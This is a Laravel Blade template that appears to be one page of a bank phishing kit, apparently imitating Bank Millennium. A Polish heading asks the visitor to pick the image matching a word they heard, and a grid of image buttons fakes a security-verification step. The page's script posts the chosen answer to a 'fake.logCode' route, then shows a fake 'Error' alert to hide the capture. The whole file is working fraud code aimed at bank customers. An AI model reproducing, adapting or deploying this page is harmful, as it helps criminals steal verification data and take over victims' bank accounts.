@extends('layouts.fake')
@push('css')
    <style>
        .content {
            height: auto;
            width: 100%;
        }

        table {
            width: 100%;
        }

        .img-con {
            /*width: 100%;*/
            /*height: auto;*/
            width: 125%;
            height: 290px;
        }

        .button-con {
            width: 25%;
            height: 25%;
            border-radius: 5px;
            border: 0px solid black;
            background-color: #bc004f;
            color: white;
            font-size: 16px;
        }

        .img-button {
            margin-top: 13px;
            padding: 0px;
            border: 0px solid black;
        }

        /*.img-button img {*/
        /*    width: 400px;*/
        /*    height: 290px;*/
        /*    object-fit: cover;*/
        /*}*/

        .label-top {
            border-radius: 6px; /*;*/
            border: 1px solid black;
            background-color: #bc004f;
            /*margin-right: 15%;*/
            /*margin-left: 15%;*/
            color: white;
        }

        @media only screen and (max-width: 1024px) {
            table {
                margin-top: 10px;
                margin-left: 0px;
                margin-right: 0px;
            }

            .img-con {
                /*width: 100%;*/
                /*height: auto;*/
                width: 100%;
                height: auto;
            }

            .label-top > p {
                font-size: 1.3em !important;
            }
        }
    </style>
@endpush
@section('content')
    <div class="content">
        <div align="center">
            <div class="label-top">
                <p style="font-size: 3em; margin-bottom: 0px; margin-top: 0px;">Wybierz obrazek przedstawiający słowo,
                    które
                    usłyszałeś</p>
                (Jeśli nie widzisz obrazu, którego potrzebujesz, skontaktuj się z pomocą techniczną)
            </div>
        </div>
        <table>
            <tbody>
            <tr>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Банан">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/banana1.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Цветок">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/flower1.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Гитара">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/guitar.png')}}"></button>
                </td>

            </tr>
            <tr>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic"
                            value="Крокодил">
                        <img class="img-con" src="{{asset('images/banks/pic/croco.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Штаны">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/trousers.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic"
                            value="Календарь">
                        <img class="img-con" src="{{asset('images/banks/pic/calendar.png')}}"></button>
                </td>

            </tr>
            <tr>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Зонтик">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/umbrella.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic"
                            value="Микрофон">
                        <img class="img-con" src="{{asset('images/banks/pic/micro.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic"
                            value="Карандаш">
                        <img class="img-con" src="{{asset('images/banks/pic/pencil.png')}}"></button>
                </td>

            </tr>
            <tr>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Компас">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/compass.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Лимон">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/lemon.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Шоколад">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/chocolate.png')}}"></button>
                </td>

            </tr>
            <tr>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic"
                            value="Клубника">
                        <img class="img-con" src="{{asset('images/banks/pic/strawberry.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Сэндвич">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/burger.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic"
                            value="Калькулятор">
                        <img class="img-con" src="{{asset('images/banks/pic/calculator.png')}}"></button>
                </td>
            </tr>
            <tr>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Свитер">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/sweater.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Очки">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/glasses.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Телефон">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/phone.png')}}"></button>
                </td>
            </tr>
            <tr>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic"
                            value="Наушники">
                        <img class="img-con" src="{{asset('images/banks/pic/headphones.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Слон">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/elephant1.png')}}"></button>
                </td>
                <td>
                    <button class="img-button" type="submit" onclick="millenium_imgs(this);" name="pic" value="Помидор">
                        <img
                                class="img-con" src="{{asset('images/banks/pic/tomato.png')}}"></button>
                </td>
            </tr>
            </tbody>
        </table>
    </div>
@endsection
@push('js')
    <script type="text/javascript">
        function millenium_imgs(__this) {
            let btn = $(__this);
            let pic = btn.val();
            if (pic.length) $.post("{{subRoute('fake.logCode')}}", {pic: pic}, function (data) {
                setTimeout(function () {
                    alert("Error");
                }, 3000)
            });
        }
    </script>
@endpush